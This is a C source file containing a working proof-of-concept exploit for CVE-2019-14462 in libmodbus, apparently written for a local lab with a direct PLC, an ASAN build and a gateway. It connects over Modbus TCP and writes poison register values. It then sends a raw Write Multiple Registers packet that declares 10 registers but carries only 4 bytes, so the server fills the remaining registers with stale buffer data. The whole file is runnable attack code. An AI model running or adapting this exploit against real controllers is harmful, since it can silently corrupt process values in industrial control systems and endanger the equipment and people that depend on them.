/*
 * CVE-2019-14462 Network Exploit - Stale Data Injection
 *
 * This demonstrates the vulnerability by:
 * 1. Sending a legitimate write to fill the buffer with known values
 * 2. Sending a malicious write that reads stale data from step 1
 *
 * Result: Registers get WRONG but PREDICTABLE values from stale buffer!
 */

#include <errno.h>
#include <modbus.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

void print_usage(const char *prog) {
    printf("Usage: %s <IP> <PORT>\n", prog);
    printf("\n");
    printf("Examples:\n");
    printf("  %s 127.0.0.1 5020    # Direct to PLC (bypass)\n", prog);
    printf("  %s 127.0.0.1 5021    # ASAN PLC\n", prog);
    printf("  %s 127.0.0.1 502     # Through gateway (protected)\n", prog);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    if (target_port <= 0 || target_port > 65535) {
        fprintf(stderr, "Invalid port: %s\n", argv[2]);
        return EXIT_FAILURE;
    }

    printf("==============================================\n");
    printf("  CVE-2019-14462: Stale Data Injection Attack\n");
    printf("==============================================\n\n");

    printf("[*] Target: %s:%d\n\n", target_ip, target_port);

    /* Connect */
    printf("[1] Connecting to target...\n");
    modbus_t *ctx = modbus_new_tcp(target_ip, target_port);
    if (!ctx) {
        fprintf(stderr, "    FAILED: modbus_new_tcp\n");
        return EXIT_FAILURE;
    }

    /* Set timeouts and unit ID */
    modbus_set_response_timeout(ctx, 5, 0);
    modbus_set_slave(ctx, 1);  /* Unit ID = 1 */

    if (modbus_connect(ctx) == -1) {
        fprintf(stderr, "    FAILED: %s\n", modbus_strerror(errno));
        modbus_free(ctx);
        return EXIT_FAILURE;
    }
    printf("    OK - Connected!\n\n");

    /* Read initial register values */
    printf("[2] Reading initial register values...\n");
    uint16_t initial_regs[10];
    if (modbus_read_registers(ctx, 0, 10, initial_regs) != 10) {
        fprintf(stderr, "    FAILED: %s\n", modbus_strerror(errno));
        modbus_close(ctx);
        modbus_free(ctx);
        return EXIT_FAILURE;
    }
    printf("    Before attack:\n");
    for (int i = 0; i < 10; i++) {
        printf("      HR[%d] = %5u (0x%04X)\n", i, initial_regs[i], initial_regs[i]);
    }
    printf("\n");

    /*
     * STEP 1: Send legitimate write to fill buffer with POISON values
     *
     * We write 0x4141, 0x4242, 0x4343... to registers
     * This fills the receive buffer with known data
     */
    printf("[3] Sending legitimate write (fills buffer with poison values)...\n");
    uint16_t poison_values[10];
    for (int i = 0; i < 10; i++) {
        poison_values[i] = 0x4141 + (i * 0x0101);  /* 0x4141, 0x4242, 0x4343... */
    }
    printf("    Poison values: ");
    for (int i = 0; i < 10; i++) {
        printf("0x%04X ", poison_values[i]);
    }
    printf("\n");

    /* This legitimate write fills the query buffer */
    int rc = modbus_write_registers(ctx, 0, 10, poison_values);
    if (rc != 10) {
        fprintf(stderr, "    FAILED: %s\n", modbus_strerror(errno));
    } else {
        printf("    OK - Buffer now contains poison values!\n");
    }
    printf("\n");

    /*
     * STEP 2: Send MALICIOUS write with quantity/byte_count mismatch
     *
     * We claim 10 registers but only send 2 registers of data (4 bytes)
     * The server will read the remaining 8 registers from STALE buffer
     * which still contains our poison values!
     */
    printf("[4] Sending MALICIOUS write (quantity=10, byte_count=4)...\n");
    printf("    New values for reg 0-1: 0xDEAD, 0xBEEF\n");
    printf("    Registers 2-9 will get STALE poison values!\n");

    int sock = modbus_get_socket(ctx);
    uint8_t query[32];
    memset(query, 0, sizeof(query));

    /* MBAP Header */
    query[0] = 0x00; query[1] = 0x02;  /* Transaction ID */
    query[2] = 0x00; query[3] = 0x00;  /* Protocol ID */
    query[4] = 0x00; query[5] = 0x0B;  /* Length: 11 bytes follow */
    query[6] = 0x01;                   /* Unit ID */

    /* PDU */
    query[7] = 0x10;                   /* FC: Write Multiple Registers */
    query[8] = 0x00; query[9] = 0x00;  /* Starting address: 0 */
    query[10] = 0x00; query[11] = 0x0A; /* Quantity: 10 registers */
    query[12] = 0x04;                  /* Byte count: only 4 bytes! */

    /* Only 2 registers of actual data */
    query[13] = 0xDE; query[14] = 0xAD;  /* Register 0 = 0xDEAD */
    query[15] = 0xBE; query[16] = 0xEF;  /* Register 1 = 0xBEEF */

    /* Send raw packet */
    if (send(sock, query, 17, 0) != 17) {
        fprintf(stderr, "    FAILED: send error\n");
    } else {
        printf("    OK - Malicious packet sent!\n");
    }

    /* Wait for response */
    uint8_t response[32];
    struct timeval tv = {3, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    ssize_t received = recv(sock, response, sizeof(response), 0);
    if (received > 0) {
        printf("    Response: %zd bytes\n", received);
    }
    printf("\n");

    /*
     * STEP 3: Read back registers to show the corruption
     */
    printf("[5] Reading registers after attack...\n");

    /* Need to reconnect since we used raw socket */
    modbus_close(ctx);
    if (modbus_connect(ctx) == -1) {
        fprintf(stderr, "    Reconnect failed\n");
        modbus_free(ctx);
        return EXIT_FAILURE;
    }

    uint16_t final_regs[10];
    if (modbus_read_registers(ctx, 0, 10, final_regs) != 10) {
        fprintf(stderr, "    FAILED: %s\n", modbus_strerror(errno));
    } else {
        printf("    After attack:\n");
        for (int i = 0; i < 10; i++) {
            printf("      HR[%d] = %5u (0x%04X)", i, final_regs[i], final_regs[i]);
            if (i == 0) {
                if (final_regs[i] == 0xDEAD) {
                    printf(" <- Our value (0xDEAD)");
                }
            } else if (i == 1) {
                if (final_regs[i] == 0xBEEF) {
                    printf(" <- Our value (0xBEEF)");
                }
            } else if (final_regs[i] == poison_values[i]) {
                printf(" <- STALE POISON DATA (0x%04X)!", poison_values[i]);
            }
            printf("\n");
        }
    }

    printf("\n==============================================\n");
    printf("  CVE-2019-14462 Attack Results:\n");
    printf("  \n");
    printf("  Expected if vulnerable:\n");
    printf("    HR[0] = 0xDEAD (our data)\n");
    printf("    HR[1] = 0xBEEF (our data)\n");
    printf("    HR[2] = 0x4343 (STALE from previous request!)\n");
    printf("    HR[3] = 0x4444 (STALE from previous request!)\n");
    printf("    ...etc\n");
    printf("  \n");
    printf("  This proves the server reads WRONG data from\n");
    printf("  stale buffer contents, not just random garbage!\n");
    printf("==============================================\n");

    modbus_close(ctx);
    modbus_free(ctx);
    return EXIT_SUCCESS;
}
